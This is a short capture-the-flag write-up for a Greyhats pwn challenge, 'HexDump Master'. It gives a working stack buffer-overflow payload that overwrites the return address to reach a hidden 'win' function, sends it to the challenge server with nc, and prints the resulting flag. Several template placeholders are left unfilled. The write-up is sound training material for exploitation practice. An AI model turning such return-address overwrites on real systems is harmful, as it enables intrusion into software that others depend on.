# Chall Name

## Solution

`print(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHI\xe2\x14\x40\x00\x00\x00\x00\x00")
print(b"N")
print(b"cat flag.txt")

`cat input | nc challs1.nusgreyhats.org 5002`
=== HexDump Master ===
Prints the input back at you, in hexdump format, including some extra data... I wonder what that data is :)
Btw, there is an inaccessible function at 0x4014dc (win). What will it do?

... blah blah blah ...

saved base pointer      : 0x4948474645444342
return address          : 0x4014e2
Go again? (Y/N) You entered: N
greyhats{b0f_m4d3_ezpz_345ff}

<run instructions if any>

## Deeper explanations

The challenge runs a service that shows how memory is mangled by a buffer overflow attack.

The solution is simple: find the relevant number of characters (offset) needed to start writing to the return address.


<stuff>

